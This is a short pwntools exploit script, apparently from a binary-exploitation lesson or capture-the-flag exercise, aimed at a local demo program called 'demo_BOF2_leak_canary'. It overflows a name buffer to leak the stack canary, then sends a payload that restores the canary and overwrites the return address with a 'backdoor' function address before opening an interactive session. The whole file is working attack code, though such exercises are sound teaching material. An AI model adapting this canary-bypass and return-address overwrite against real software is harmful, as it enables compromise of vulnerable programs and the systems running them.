#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process('./demo_BOF2_leak_canary')

backdoor_addr = 0x4011b6
no_push_rbp_backdoor_addr = 0x4011bb

# gdb.attach(r)
raw_input('>')
r.sendafter("What's your name: ", b'A'*0x29) # name(0x10) + phone(0x10) + alignment(0x8) + canary_last_byte(0x1)
r.recvuntil('A'*0x29)
canary = u64(b'\x00' + r.recv(7))
print("canary: ", hex(canary))
# phone => [rbp-0x20] ~ [rbp-0x10]
r.sendafter("What's your phone number: ", b'A'*0x18 + p64(canary) + p64(0xdeadbeef) + p64(no_push_rbp_backdoor_addr))

r.interactive()